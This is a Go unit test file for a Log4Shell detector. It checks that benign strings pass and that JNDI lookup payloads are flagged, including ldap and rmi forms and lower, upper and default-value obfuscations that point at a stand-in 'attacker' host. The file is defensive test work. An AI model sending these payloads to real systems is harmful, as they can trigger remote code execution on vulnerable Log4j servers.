package detector_test

import (
	"testing"

	"github.com/m-mizutani/gt"
	"github.com/m-mizutani/semgate-example/pkg/domain/detector"
	"github.com/m-mizutani/semgate-example/pkg/domain/model"
)

func TestLog4Shell_Inspect(t *testing.T) {
	d := detector.NewLog4Shell()

	testCases := map[string]struct {
		value     string
		wantFired bool
	}{
		"benign user agent":   {value: "Mozilla/5.0 (Macintosh)", wantFired: false},
		"benign env lookup":   {value: "${env:USER}", wantFired: false},
		"jndi as plain text":  {value: "documentation about jndi: naming", wantFired: false},
		"jndi as env sub-key": {value: "${env:jndi:ldap}", wantFired: false},
		"plain jndi ldap":     {value: "${jndi:ldap://attacker/x}", wantFired: true},
		"jndi rmi":            {value: "${jndi:rmi://attacker/x}", wantFired: true},
		"lower obfuscation":   {value: "${${lower:j}ndi:ldap://attacker/x}", wantFired: true},
		"default obfuscation": {value: "${${::-j}ndi:ldap://attacker/x}", wantFired: true},
		"upper obfuscation":   {value: "${jndi:${upper:l}dap://attacker/x}", wantFired: true},
	}

	for name, tc := range testCases {
		t.Run(name, func(t *testing.T) {
			v := d.Inspect(tc.value)
			wantFired(t, v.Fired, tc.wantFired)
			if tc.wantFired {
				gt.Value(t, v.Category).Equal(model.CategoryLog4Shell)
				gt.String(t, v.RuleID).Equal("log4shell_jndi_lookup")
			}
		})
	}
}
